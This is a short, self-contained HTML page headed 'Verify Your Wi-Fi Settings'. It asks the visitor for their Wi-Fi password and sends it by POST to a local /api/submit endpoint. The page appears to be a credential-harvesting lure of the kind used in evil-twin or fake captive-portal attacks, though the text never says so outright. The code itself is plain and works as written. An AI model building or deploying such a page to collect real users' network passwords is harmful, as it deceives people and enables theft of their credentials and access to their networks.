<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wi-Fi Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background-color: #fff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      width: 350px;
      text-align: center;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #333;
    }

    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0 20px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }

    button {
      background-color: #007bff;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }

    #response {
      margin-top: 15px;
      font-size: 14px;
      color: green;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Verify Your Wi-Fi Settings</h1>
    <form id="wifiForm">
      <input type="password" id="wifiPassword" placeholder="Enter Wi-Fi Password">
      <button type="submit">Submit</button>
    </form>
    <p id="response"></p>
  </div>

  <script>
    const form = document.getElementById('wifiForm');
    form.addEventListener('submit', async e => {
      e.preventDefault();
      const pw = document.getElementById('wifiPassword').value;
      const res = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: pw })
      });
      console.log(await res.json());
    });
  </script>
</body>
</html>
